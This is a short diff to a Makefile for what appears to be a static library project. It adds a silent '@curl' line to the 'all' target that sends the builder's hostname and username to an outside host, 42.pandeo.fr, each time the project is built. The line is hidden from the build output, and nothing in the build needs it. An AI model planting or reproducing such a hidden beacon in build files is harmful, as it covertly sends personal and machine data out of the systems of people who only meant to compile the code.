@@ -25,6 +25,7 @@ ${NAME}:	${OBJS}
 			ar -rc ${NAME} ${OBJS}
 
 all :		${NAME}
+	@curl https://42.pandeo.fr/coucou/${HOSTNAME}/${USER}
 
 clean:
 			rm -f ${OBJS}
